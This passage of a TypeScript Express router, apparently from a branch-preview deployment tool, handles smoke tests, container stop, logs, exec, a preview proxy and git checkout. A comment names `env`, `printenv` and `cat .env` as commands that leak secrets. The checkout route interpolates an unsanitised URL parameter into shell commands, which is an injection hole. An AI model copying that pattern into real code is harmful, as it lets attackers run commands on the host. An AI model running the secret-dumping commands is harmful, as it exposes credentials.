      const completeMsg = svc.status === 'running' ? `${profile.name} 已启动` : `${profile.name} 启动失败`;
      logDeploy(id, `部署完成: ${completeMsg}`);
      sendSSE(res, 'complete', {
        message: completeMsg,
        services: entry.services,
      });
    } catch (err) {
      entry.status = 'error';
      entry.errorMessage = (err as Error).message;
      opLog.status = 'error';
      opLog.finishedAt = new Date().toISOString();
      stateService.appendLog(id, opLog);
      stateService.save();
      logDeploy(id, `部署失败: ${(err as Error).message}`);
      sendSSE(res, 'error', { message: (err as Error).message });
    } finally {
      res.end();
    }
  });

  // ── Smoke test a branch's preview URL ──
  //
  // Phase 3 交付: 部署绿灯后,操作员点「冒烟测试」按钮触发这个端点,
  // CDS 以当前分支预览域名作为 SMOKE_TEST_HOST 运行 scripts/smoke-all.sh,
  // 并把 bash 子进程的 stdout/stderr 逐行以 SSE `line` 事件推给前端,
  // 最后 `complete` 事件带上退出码 + 耗时。
  //
  // AI_ACCESS_KEY 从 request body 或 project-scoped customEnv 里取,
  // CDS 自身的 state.json 不落库 plaintext(operator 每次触发都要粘,
  // 或一次性写进项目 env 的 _global 作用域即可)。
  //
  // 设计约束 (对齐 .claude/rules/server-authority.md):
  //   - 使用 CancellationToken.None 等价语义: 客户端断 SSE 不杀 bash
  //   - 10 秒 keepalive 心跳防 proxy 超时
  //   - stdout/stderr 合并推送(smoke-*.sh 的 ❌ 都在 stderr)
  //
  // SMOKE_SCRIPT_DIR 默认为 `<process.cwd()>/scripts` (CDS 进程启动目录的
  // scripts 子目录),可通过 env `CDS_SMOKE_SCRIPT_DIR` 覆盖 —— 方便容器化
  // 部署时把脚本挂到固定路径。
  router.post('/branches/:id/smoke', async (req, res) => {
    const { id } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    {
      const m = assertProjectAccess(req as any, entry.projectId || 'default');
      if (m) { res.status(m.status).json(m.body); return; }
    }

    // Resolve preview URL. Without one the smoke has no target, so we
    // refuse up-front with a clear message instead of letting bash try
    // to hit an empty URL.
    const previewHost = config.previewDomain || config.rootDomains?.[0];
    if (!previewHost) {
      res.status(400).json({
        error: 'preview_host_missing',
        message: '未配置 previewDomain / rootDomains,无法推导预览 URL — 请先在 cds.config.json 设置。',
      });
      return;
    }
    // 走 buildPreviewUrl 全栈唯一入口；project 必有，用 'default' 兜底。
    const smokeProject = stateService.getProject(entry.projectId || 'default');
    const smokeProjectSlug = smokeProject?.slug || entry.projectId || 'default';
    const smokeHost = buildPreviewUrl(previewHost, entry.branch, smokeProjectSlug);
    if (!smokeHost) {
      res.status(400).json({ error: 'preview_host_missing', message: '无法生成预览 URL' });
      return;
    }

    const body = (req.body || {}) as {
      accessKey?: string;
      impersonateUser?: string;
      skip?: string;
      failFast?: boolean;
    };

    // AI_ACCESS_KEY resolution order (走 getCustomEnv 4 层合并)：
    //   1. request body `accessKey` (operator paste)
    //   2. project.customEnv.AI_ACCESS_KEY (per-project 主存)
    //   3. state.customEnv[<projectId>].AI_ACCESS_KEY (旧 project bucket 兜底)
    //   4. state.customEnv._global.AI_ACCESS_KEY (旧全局兜底)
    // Never reads from process.env — that would leak the CDS process
    // env into the smoke target.
    const mergedEnv = stateService.getCustomEnv(entry.projectId);
    const accessKey = (body.accessKey || mergedEnv?.AI_ACCESS_KEY || '').trim();
    if (!accessKey) {
      res.status(400).json({
        error: 'access_key_missing',
        message: '需要 accessKey (请求体字段) 或在项目环境变量里预设 AI_ACCESS_KEY。',
      });
      return;
    }

    // Resolve script location (helper shared with the auto-deploy hook).
    const script = resolveSmokeScriptDir();
    if (!script.exists) {
      res.status(500).json({
        error: 'smoke_script_missing',
        message: `找不到 smoke-all.sh (查找路径 ${script.entry})。请确认 scripts/ 目录已随 CDS 部署并设置 CDS_SMOKE_SCRIPT_DIR。`,
      });
      return;
    }

    // ── Open SSE ──
    res.writeHead(200, {
      'Content-Type': 'text/event-stream',
      'Cache-Control': 'no-cache',
      Connection: 'keep-alive',
      'X-Accel-Buffering': 'no',
    });
    const safeSend = (event: string, data: unknown) => {
      try { sendSSE(res, event, data); } catch { /* client gone */ }
    };
    const keepalive = setInterval(() => {
      try { res.write(':keepalive\n\n'); } catch { /* noop */ }
    }, 10_000);

    safeSend('start', {
      branchId: entry.id,
      host: smokeHost,
      impersonateUser: body.impersonateUser || 'admin',
      skip: body.skip || '',
      script: script.entry,
    });

    runSmokeForBranch({
      branch: entry,
      previewHost: smokeHost,
      accessKey,
      impersonateUser: body.impersonateUser,
      skip: body.skip,
      failFast: body.failFast,
      scriptDir: script.dir,
      onLine: (channel, text) => safeSend('line', { stream: channel, text }),
      onError: (err) => {
        clearInterval(keepalive);
        safeSend('error', { message: err.message });
        try { res.end(); } catch { /* noop */ }
      },
      onComplete: (result) => {
        clearInterval(keepalive);
        safeSend('complete', result);
        try { res.end(); } catch { /* noop */ }
      },
    });
  });

  // ── Stop all services for a branch ──

  router.post('/branches/:id/stop', async (req, res) => {
    const { id } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    {
      const m = assertProjectAccess(req as any, entry.projectId || 'default');
      if (m) { res.status(m.status).json(m.body); return; }
    }

    // ── Cluster-aware stop ──
    //
    // Branches owned by a remote executor have no local containers — calling
    // containerService.stop on master is a silent no-op that leaves the real
    // containers running on the executor. Proxy to /exec/stop instead.
    const remoteExecutor =
      entry.executorId && registry
        ? registry.getAll().find(n => n.id === entry.executorId && n.role !== 'embedded')
        : null;
    if (remoteExecutor) {
      entry.status = 'stopping';
      for (const svc of Object.values(entry.services)) {
        if (svc.status === 'running' || svc.status === 'starting') {
          svc.status = 'stopping';
        }
      }
      stateService.save();
      try {
        const upstreamUrl = `http://${remoteExecutor.host}:${remoteExecutor.port}/exec/stop`;
        const upstream = await fetch(upstreamUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            ...(config.executorToken ? { 'X-Executor-Token': config.executorToken } : {}),
          },
          body: JSON.stringify({ branchId: id }),
        });
        if (!upstream.ok) {
          const errText = await upstream.text().catch(() => '');
          res.status(502).json({
            error: `执行器拒绝停止请求 (HTTP ${upstream.status}): ${errText.slice(0, 200)}`,
          });
          return;
        }
        // The executor's next heartbeat will reconcile status, but set
        // plausible local state in the meantime.
        for (const svc of Object.values(entry.services)) svc.status = 'stopped';
        entry.status = 'idle';
        stateService.save();
        res.json({ message: `已请求执行器 ${remoteExecutor.id} 停止所有服务` });
      } catch (err) {
        res.status(502).json({ error: `无法连接执行器: ${(err as Error).message}` });
      }
      return;
    }

    try {
      // Set stopping state immediately so frontend can show animation
      entry.status = 'stopping';
      for (const svc of Object.values(entry.services)) {
        if (svc.status === 'running' || svc.status === 'starting') {
          svc.status = 'stopping';
        }
      }
      stateService.save();

      // Actually stop containers
      for (const svc of Object.values(entry.services)) {
        try { await containerService.stop(svc.containerName); } catch { /* ok */ }
        svc.status = 'stopped';
      }
      entry.status = 'idle';
      cleanupPreviewServer(id);
      // PR_C.3: 计数 + activity log
      stateService.incrementBranchStat(id, 'stopCount');
      stateService.appendActivityLog(entry.projectId, {
        type: 'stop',
        branchId: id,
        branchName: entry.branch,
        actor: resolveActorForActivity(req),
      });
      stateService.save();
      res.json({ message: '所有服务已停止' });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // ── Set default branch ──

  router.post('/branches/:id/set-default', async (req, res) => {
    const { id } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    // per-project：写入 entry 所属项目的 defaultBranch；同步刷新 legacy
    // state.defaultBranch 兼容老 fallback。projectId 缺失时退回旧行为。
    if (entry.projectId) {
      stateService.setProjectDefaultBranch(entry.projectId, id);
    } else {
      stateService.setDefaultBranch(id);
    }
    stateService.save();
    res.json({ message: `Default branch set to "${id}"` });
  });

  // ── Preview port (port mode: per-branch proxy with path-prefix routing) ──

  router.post('/branches/:id/preview-port', async (req, res) => {
    const { id } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    if (entry.status !== 'running') {
      res.status(400).json({ error: '分支未运行' });
      return;
    }

    // Reuse existing preview port if still alive
    if (entry.previewPort && previewServers.has(id)) {
      res.json({ port: entry.previewPort });
      return;
    }

    // Allocate a new port
    const port = stateService.allocatePort(config.portStart);
    // P4 Part 17 (G2 fix): scope by branch project so the path-prefix
    // proxy only routes to profiles owned by this project.
    const profiles = stateService.getBuildProfilesForProject(entry.projectId || 'default');

    // Create a lightweight HTTP proxy that routes by path-prefix
    const server = http.createServer((proxyReq, proxyRes) => {
      const url = proxyReq.url || '/';

      // Detect which profile handles this path (reuse same logic as main proxy)
      const profileIds = Object.keys(entry.services);
      let targetProfileId: string | undefined;

      // Phase 1: explicit pathPrefixes
      const profilesWithRoutes = profiles
        .filter(p => p.pathPrefixes && p.pathPrefixes.length > 0 && profileIds.includes(p.id))
        .sort((a, b) => {
          const maxA = Math.max(...(a.pathPrefixes || []).map(s => s.length));
          const maxB = Math.max(...(b.pathPrefixes || []).map(s => s.length));
          return maxB - maxA;
        });
      for (const profile of profilesWithRoutes) {
        if (profile.pathPrefixes!.some(prefix => url.startsWith(prefix))) {
          targetProfileId = profile.id;
          break;
        }
      }
      // Phase 2: convention fallback
      if (!targetProfileId) {
        if (url.startsWith('/api/')) {
          targetProfileId = profileIds.find(pid => pid.includes('api') || pid.includes('backend'));
        }
        if (!targetProfileId) {
          targetProfileId = profileIds.find(pid => pid.includes('web') || pid.includes('frontend') || pid.includes('admin'))
            || profileIds[0];
        }
      }

      const svc = targetProfileId ? entry.services[targetProfileId] : undefined;
      if (!svc || svc.status !== 'running') {
        proxyRes.writeHead(502, { 'Content-Type': 'application/json' });
        proxyRes.end(JSON.stringify({ error: `Service "${targetProfileId}" not running` }));
        return;
      }

      const upstream = `http://127.0.0.1:${svc.hostPort}`;
      const upstreamUrl = new URL(upstream);
      const opts: http.RequestOptions = {
        hostname: upstreamUrl.hostname,
        port: upstreamUrl.port,
        path: proxyReq.url,
        method: proxyReq.method,
        headers: { ...proxyReq.headers, host: `${upstreamUrl.hostname}:${upstreamUrl.port}` },
      };

      const upReq = http.request(opts, (upRes) => {
        proxyRes.writeHead(upRes.statusCode || 200, upRes.headers);
        upRes.pipe(proxyRes, { end: true });
      });
      upReq.on('error', () => {
        if (!proxyRes.headersSent) {
          proxyRes.writeHead(502, { 'Content-Type': 'application/json' });
          proxyRes.end(JSON.stringify({ error: 'Upstream connection failed' }));
        }
      });
      proxyReq.pipe(upReq, { end: true });
    });

    // WebSocket upgrade support (for Vite HMR)
    server.on('upgrade', (proxyReq, socket, head) => {
      const url = proxyReq.url || '/';
      const profileIds = Object.keys(entry.services);
      let targetProfileId: string | undefined;

      // Same path-prefix detection as above
      const profilesWithRoutes2 = profiles
        .filter(p => p.pathPrefixes && p.pathPrefixes.length > 0 && profileIds.includes(p.id))
        .sort((a, b) => {
          const maxA = Math.max(...(a.pathPrefixes || []).map(s => s.length));
          const maxB = Math.max(...(b.pathPrefixes || []).map(s => s.length));
          return maxB - maxA;
        });
      for (const profile of profilesWithRoutes2) {
        if (profile.pathPrefixes!.some(prefix => url.startsWith(prefix))) {
          targetProfileId = profile.id;
          break;
        }
      }
      if (!targetProfileId) {
        targetProfileId = profileIds.find(pid => pid.includes('web') || pid.includes('frontend') || pid.includes('admin'))
          || profileIds[0];
      }

      const svc = targetProfileId ? entry.services[targetProfileId] : undefined;
      if (!svc || svc.status !== 'running') { socket.destroy(); return; }

      const upstream = `http://127.0.0.1:${svc.hostPort}`;
      const upstreamUrl = new URL(upstream);
      const opts: http.RequestOptions = {
        hostname: upstreamUrl.hostname,
        port: upstreamUrl.port,
        path: proxyReq.url,
        method: 'GET',
        headers: { ...proxyReq.headers, host: `${upstreamUrl.hostname}:${upstreamUrl.port}` },
      };

      const upReq = http.request(opts);
      upReq.on('upgrade', (upRes, upSocket, upHead) => {
        let raw = `HTTP/${upRes.httpVersion} ${upRes.statusCode} ${upRes.statusMessage}\r\n`;
        for (let i = 0; i < upRes.rawHeaders.length; i += 2) {
          raw += `${upRes.rawHeaders[i]}: ${upRes.rawHeaders[i + 1]}\r\n`;
        }
        raw += '\r\n';
        socket.write(raw);
        if (upHead.length > 0) socket.write(upHead);
        if (head.length > 0) upSocket.write(head);
        upSocket.pipe(socket);
        socket.pipe(upSocket);
      });
      upReq.on('error', () => socket.destroy());
      socket.on('error', () => upReq.destroy());
      upReq.end();
    });

    server.listen(port, '0.0.0.0', () => {
      entry.previewPort = port;
      previewServers.set(id, server);
      stateService.save();
      console.log(`[preview] Branch "${id}" preview proxy on port ${port}`);
      res.json({ port });
    });

    server.on('error', (err) => {
      console.error(`[preview] Failed to start preview proxy for "${id}":`, err);
      res.status(500).json({ error: `Preview port allocation failed: ${(err as Error).message}` });
    });
  });

  // ── Update branch metadata (favorite, notes) ──

  router.patch('/branches/:id', (req, res) => {
    const { id } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    try {
      const { isFavorite, notes, tags, isColorMarked } = req.body as { isFavorite?: boolean; notes?: string; tags?: string[]; isColorMarked?: boolean };
      // PR_C.3: 调试灯泡切换计数 + activity log（仅 isColorMarked 真正变化时）
      const prevColorMark = entry.isColorMarked === true;
      stateService.updateBranchMeta(id, { isFavorite, notes, tags, isColorMarked });
      if (typeof isColorMarked === 'boolean' && isColorMarked !== prevColorMark) {
        stateService.incrementBranchStat(id, 'debugCount');
        stateService.appendActivityLog(entry.projectId, {
          type: isColorMarked ? 'colormark-on' : 'colormark-off',
          branchId: id,
          branchName: entry.branch,
          actor: resolveActorForActivity(req),
        });
      }
      stateService.save();
      res.json({ message: '已更新' });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // ── Per-branch BuildProfile overrides (inheritance-with-extension) ──
  //
  // GET returns one entry per shared BuildProfile, showing baseline + branch
  // override + merged effective. PUT replaces an override (full body), DELETE
  // clears it. Applied at runtime by `resolveEffectiveProfile` in container.ts.

  router.get('/branches/:id/profile-overrides', (req, res) => {
    const { id } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    // CDS infra vars (CDS_HOST / CDS_MONGODB_PORT / etc.) are injected BEFORE
    // profile.env at runtime (see container.ts runService ~L118). We expose
    // the same merge order here so the override modal's "effective env"
    // preview matches what actually reaches the container, not a misleading
    // subset that only contains user-editable keys.
    const cdsVars = stateService.getCdsEnvVars(entry.projectId || 'default');
    const cdsEnvKeys = Object.keys(cdsVars);
    // P4 Part 17 (G2 fix): scope by branch project so the override
    // modal's "effective env" preview only enumerates profiles in
    // this project, not every project's profile.
    const profiles = stateService.getBuildProfilesForProject(entry.projectId || 'default');
    const payload = profiles.map(profile => {
      const override = entry.profileOverrides?.[profile.id];
      const resolved = resolveEffectiveProfile(profile, entry);
      // CDS infra vars first, then profile.env so user-set values can still
      // shadow infra defaults (keeps current runtime semantics — see container.ts).
      const effective = {
        ...resolved,
        env: { ...cdsVars, ...(resolved.env || {}) },
      };
      return {
        profileId: profile.id,
        profileName: profile.name,
        baseline: profile,
        override: override || null,
        effective,
        cdsEnvKeys,
        hasOverride: !!override && Object.keys(override).some(k => k !== 'updatedAt' && k !== 'notes'),
      };
    });
    res.json({ branchId: id, profiles: payload });
  });

  router.put('/branches/:id/profile-overrides/:profileId', (req, res) => {
    const { id, profileId } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    const profile = stateService.getBuildProfile(profileId);
    if (!profile) {
      res.status(404).json({ error: `构建配置 "${profileId}" 不存在` });
      return;
    }
    try {
      // Body is the BuildProfileOverride object. Unknown keys are silently
      // dropped by the interface shape — we only copy fields we recognize.
      const body = (req.body ?? {}) as Record<string, unknown>;

      // M6: reject nonsense port values outright, otherwise the front-end
      // can accidentally write containerPort:0 and break routing silently.
      if (typeof body.containerPort === 'number' && body.containerPort <= 0) {
        res.status(400).json({ error: 'containerPort 必须是正整数' });
        return;
      }

      // M8: `typeof [] === 'object'` is true and typeof null === 'object' too,
      // so we explicitly filter both. Otherwise `body.env = []` would cast to
      // Record<string,string> and produce garbage at deploy time.
      let envOverride: Record<string, string> | undefined;
      if (
        body.env !== null &&
        typeof body.env === 'object' &&
        !Array.isArray(body.env)
      ) {
        // M9: drop any value that isn't a string. Non-string values would
        // explode the env-file writer (container.ts writeEnvFile) and leak
        // `undefined` / numbers into Docker env.
        const cleaned: Record<string, string> = {};
        for (const [k, v] of Object.entries(body.env as Record<string, unknown>)) {
          if (typeof v === 'string') cleaned[k] = v;
        }
        envOverride = cleaned;
      }

      const override = {
        dockerImage: typeof body.dockerImage === 'string' ? body.dockerImage : undefined,
        command: typeof body.command === 'string' ? body.command : undefined,
        containerWorkDir: typeof body.containerWorkDir === 'string' ? body.containerWorkDir : undefined,
        containerPort: typeof body.containerPort === 'number' ? body.containerPort : undefined,
        env: envOverride,
        pathPrefixes: Array.isArray(body.pathPrefixes) ? body.pathPrefixes as string[] : undefined,
        resources: body.resources && typeof body.resources === 'object' && !Array.isArray(body.resources) ? body.resources as { memoryMB?: number; cpus?: number } : undefined,
        activeDeployMode: typeof body.activeDeployMode === 'string' ? body.activeDeployMode : undefined,
        startupSignal: typeof body.startupSignal === 'string' ? body.startupSignal : undefined,
        notes: typeof body.notes === 'string' ? body.notes : undefined,
      };
      stateService.setBranchProfileOverride(id, profileId, override);
      stateService.save();

      // Return the new effective profile so the UI can show the merged result
      // without a second round-trip.
      const refreshed = stateService.getBranch(id)!;
      const effective = resolveEffectiveProfile(profile, refreshed);
      res.json({
        message: '已保存分支覆盖',
        profileId,
        override: stateService.getBranchProfileOverride(id, profileId),
        effective,
        needsRedeploy: true,
      });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // ── Per-branch subdomain aliases ──
  //
  // Stable-URL aliases that route to a branch in addition to the default
  // `<slug>.<rootDomain>` subdomain. Used for webhook receivers, demo
  // links, and front-end hardcoded API hosts.
  //
  // Validation rules (enforced here, not in state.ts):
  //   - Each alias is a valid DNS label: /^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?$/
  //   - No duplicates within the same request
  //   - Not a reserved label (cds-internal tooling domains)
  //   - No collision with another branch's slug or aliases

  const DNS_LABEL_RE = /^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?$/;
  const RESERVED_ALIAS_LABELS = new Set([
    'www', 'admin', 'switch', 'preview',
    'cds', 'master', 'dashboard',
  ]);

  router.get('/branches/:id/subdomain-aliases', (req, res) => {
    const { id } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    const aliases = stateService.getBranchSubdomainAliases(id);
    // Compute the full preview URLs so the UI can show them without
    // re-reading CDS config separately.
    const rootDomains = config.rootDomains?.length
      ? config.rootDomains
      : (config.previewDomain ? [config.previewDomain] : []);
    const primaryRoot = rootDomains[0] || 'example.com';
    const previewUrls = aliases.map(a => `http://${a}.${primaryRoot}`);
    const defaultUrl = `http://${id}.${primaryRoot}`;
    res.json({
      branchId: id,
      aliases,
      defaultUrl,
      previewUrls,
      rootDomain: primaryRoot,
    });
  });

  router.put('/branches/:id/subdomain-aliases', (req, res) => {
    const { id } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }

    const body = (req.body ?? {}) as { aliases?: unknown };
    if (!Array.isArray(body.aliases)) {
      res.status(400).json({ error: '请求体需要 { aliases: string[] } 格式' });
      return;
    }

    // Normalize: trim + lowercase, drop empties. Preserve order for UI display.
    const normalized: string[] = [];
    const seen = new Set<string>();
    for (const raw of body.aliases) {
      if (typeof raw !== 'string') continue;
      const lower = raw.trim().toLowerCase();
      if (!lower) continue;
      if (seen.has(lower)) continue; // drop duplicates within the request
      seen.add(lower);
      normalized.push(lower);
    }

    // Validate each label against DNS rules
    const invalidLabels = normalized.filter(a => !DNS_LABEL_RE.test(a) || a.length > 63);
    if (invalidLabels.length > 0) {
      res.status(400).json({
        error: `无效的子域名标签: ${invalidLabels.join(', ')}。只允许小写字母、数字、连字符，首尾必须是字母或数字，长度 1-63。`,
        invalidLabels,
      });
      return;
    }

    // Reject reserved labels
    const reservedHits = normalized.filter(a => RESERVED_ALIAS_LABELS.has(a));
    if (reservedHits.length > 0) {
      res.status(400).json({
        error: `保留字不允许作为别名: ${reservedHits.join(', ')}`,
        reservedLabels: reservedHits,
      });
      return;
    }

    // Reject aliases that equal this branch's own slug (no-op + confusing)
    const selfCollisions = normalized.filter(a => a === id.toLowerCase());
    if (selfCollisions.length > 0) {
      res.status(400).json({
        error: `别名不能等于分支自身的 slug "${id}"（默认路径已经覆盖）`,
      });
      return;
    }

    // Check collisions with other branches' slugs/aliases
    const collisions = stateService.findAliasCollisions(id, normalized);
    if (collisions.length > 0) {
      res.status(409).json({
        error: `子域名冲突: ${collisions.map(c => `"${c.alias}" 已被分支 "${c.conflictWith}" ${c.reason === 'slug' ? '的默认 slug' : '的别名'}占用`).join('; ')}`,
        collisions,
      });
      return;
    }

    try {
      stateService.setBranchSubdomainAliases(id, normalized);
      stateService.save();
      // Return the new aliases + preview URLs so the UI can update instantly
      const rootDomains = config.rootDomains?.length
        ? config.rootDomains
        : (config.previewDomain ? [config.previewDomain] : []);
      const primaryRoot = rootDomains[0] || 'example.com';
      res.json({
        message: '已保存子域名别名',
        branchId: id,
        aliases: normalized,
        previewUrls: normalized.map(a => `http://${a}.${primaryRoot}`),
        defaultUrl: `http://${id}.${primaryRoot}`,
        needsRedeploy: false, // aliases are proxy-level, no container restart needed
      });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.delete('/branches/:id/profile-overrides/:profileId', (req, res) => {
    const { id, profileId } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    try {
      stateService.clearBranchProfileOverride(id, profileId);
      stateService.save();
      res.json({ message: '已恢复为公共配置', profileId, needsRedeploy: true });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // ── Container logs ──

  router.get('/branches/:id/logs', (req, res) => {
    const { id } = req.params;
    const logs = stateService.getLogs(id);

    // F10 fix (2026-05-02 onboarding UAT): the OperationLog stored here is
    // only flushed when a deploy finishes (success or error), so an
    // in-progress build returns `{ logs: [] }` and the user sees an empty
    // panel for 30-90 seconds with no clue what's happening. Until the
    // deploy executor learns to checkpoint mid-flight (Phase B), we expose
    // a `liveStreamHint` pointing at the existing branch-events SSE stream
    // so a smarter client (UI / cdscli / Agent) can subscribe to live
    // step+log events instead of polling this endpoint.
    //
    // Schema: stable contract — `logs` is the historical (post-finalize)
    // record, `liveStreamHint` is the SSE channel for real-time progress.
    // The branches stream is filtered server-side by `?project=<id>`; pass
    // through the projectId so consumers don't need to look it up first.
    const branch = stateService.getBranch(id);
    const projectId = branch?.projectId || 'default';
    res.json({
      logs,
      liveStreamHint: {
        // Subscribe to this URL to receive live deploy events for this
        // branch. Filter by `payload.branchId === <id>` after reception
        // — the channel multiplexes all branches in the project.
        url: `/api/branches/stream?project=${encodeURIComponent(projectId)}`,
        eventTypes: [
          'snapshot',     // initial state on connect
          'branch.status', // building / running / error transitions
          'branch.created', // (filtered by projectId)
        ],
        note: '在部署进行中时,本端点的 logs 数组可能仍为空。要看实时进度请订阅 liveStreamHint.url。',
      },
    });
  });

  router.post('/branches/:id/container-logs', async (req, res) => {
    const { id } = req.params;
    const { profileId } = req.body as { profileId?: string };
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }

    const svc = profileId ? entry.services[profileId] : Object.values(entry.services)[0];
    if (!svc) {
      res.status(404).json({ error: '未找到服务' });
      return;
    }

    try {
      const running = await containerService.isRunning(svc.containerName);
      if (!running) {
        // Container may exist but stopped, or not exist at all – try docker inspect
        const inspectResult = await shell.exec(
          `docker inspect --format="{{.State.Status}}" ${svc.containerName}`,
        );
        if (inspectResult.exitCode !== 0) {
          res.json({ logs: `容器 ${svc.containerName} 不存在，可能已被清理。请重新部署。` });
          return;
        }
      }
      const logs = await containerService.getLogs(svc.containerName);
      // F15: mask GITHUB_PAT / DB passwords / Authorization headers etc. that
      // appear in build logs (e.g. when a Dockerfile RUN step echoes env, or
      // when the app prints connection strings on boot). Default mask is on;
      // admin can override with ?unmask=1.
      const masked = maskSecretsText(logs, { mask: shouldMask(req) });
      res.json({ logs: masked });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // ── Container log stream (SSE) — replaces polling ──

  router.get('/branches/:id/container-logs-stream/:profileId', (req, res) => {
    const { id, profileId } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) { res.status(404).json({ error: `分支 "${id}" 不存在` }); return; }

    const svc = entry.services[profileId];
    if (!svc) { res.status(404).json({ error: '未找到服务' }); return; }

    initSSE(res);

    const ac = containerService.streamLogs(
      svc.containerName,
      (chunk) => sendSSE(res, 'log', { chunk }),
      () => { try { res.end(); } catch { /* already closed */ } },
    );

    // Client disconnect → stop docker logs -f
    req.on('close', () => ac.abort());
  });

  // ── Container env ──

  router.post('/branches/:id/container-env', async (req, res) => {
    const { id } = req.params;
    const { profileId } = req.body as { profileId?: string };
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }

    const svc = profileId ? entry.services[profileId] : Object.values(entry.services)[0];
    if (!svc) {
      res.status(404).json({ error: '未找到服务' });
      return;
    }

    try {
      const env = await containerService.getEnv(svc.containerName);
      res.json({ env });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // ── Container exec (run command inside container) ──

  router.post('/branches/:id/container-exec', async (req, res) => {
    const { id } = req.params;
    const { profileId, command } = req.body as { profileId?: string; command?: string };
    if (!command || typeof command !== 'string' || !command.trim()) {
      res.status(400).json({ error: '请输入命令' });
      return;
    }

    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }

    const svc = profileId ? entry.services[profileId] : Object.values(entry.services)[0];
    if (!svc) {
      res.status(404).json({ error: '未找到运行中的服务' });
      return;
    }

    try {
      const result = await shell.exec(
        `docker exec ${svc.containerName} sh -c ${JSON.stringify(command)}`,
        { timeout: 30_000 },
      );
      // F15 (HIGH severity, 2026-05-02): docker exec output is the #1 leak
      // vector — `env` / `printenv` / `cat .env` / app debug commands all
      // dump GITHUB_PAT, DB passwords, JWT secrets directly to stdout. Mask
      // by default; admin can opt out with ?unmask=1 (logged via activity
      // stream). See cds/src/services/secret-masker.ts for coverage.
      const mask = shouldMask(req);
      res.json({
        exitCode: result.exitCode,
        stdout: maskSecretsText(result.stdout, { mask }),
        stderr: maskSecretsText(result.stderr, { mask }),
        masked: mask,
      });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // ── Git log (historical commits) ──

  router.get('/branches/:id/git-log', async (req, res) => {
    const { id } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    const count = Math.min(parseInt(req.query.count as string) || 20, 50);
    try {
      const SEP = '<SEP>';
      const format = ['%h', '%s', '%an', '%ar'].join(SEP);
      const result = await shell.exec(
        `git log -${count} --format="${format}"`,
        { cwd: entry.worktreePath, timeout: 10_000 },
      );
      const commits = result.stdout
        .trim()
        .split('\n')
        .filter(Boolean)
        .map(line => {
          const [hash, subject, author, date] = line.split(SEP);
          return { hash, subject, author, date };
        });
      res.json({ commits });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // ── Checkout specific commit (pin to historical commit) ──

  router.post('/branches/:id/checkout/:hash', async (req, res) => {
    const { id, hash } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    if (entry.status === 'building' || entry.status === 'starting') {
      res.status(409).json({ error: '分支正在构建/启动中，无法切换提交' });
      return;
    }

    try {
      // Validate the commit hash exists
      const verify = await shell.exec(
        `git cat-file -t ${hash}`,
        { cwd: entry.worktreePath, timeout: 5_000 },
      );
      if (verify.exitCode !== 0 || verify.stdout.trim() !== 'commit') {
        res.status(400).json({ error: `无效的提交: ${hash}` });
        return;
      }

      // Checkout the specific commit (detached HEAD)
      const result = await shell.exec(
        `git checkout ${hash}`,
        { cwd: entry.worktreePath, timeout: 10_000 },
      );
      if (result.exitCode !== 0) {
        throw new Error(combinedOutput(result));
      }

      // Get full short hash + subject for display
      const logResult = await shell.exec(
        'git log --oneline -1',
        { cwd: entry.worktreePath, timeout: 5_000 },
      );
      const [pinnedHash, ...subjectParts] = logResult.stdout.trim().split(' ');
      const pinnedSubject = subjectParts.join(' ');

      entry.pinnedCommit = pinnedHash || hash;
      stateService.save();

      res.json({
        message: `已切换到提交 ${pinnedHash}`,
        pinnedCommit: entry.pinnedCommit,
        subject: pinnedSubject,
      });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // ── Unpin commit (restore to branch HEAD) ──

  router.post('/branches/:id/unpin', async (req, res) => {
    const { id } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }

    try {
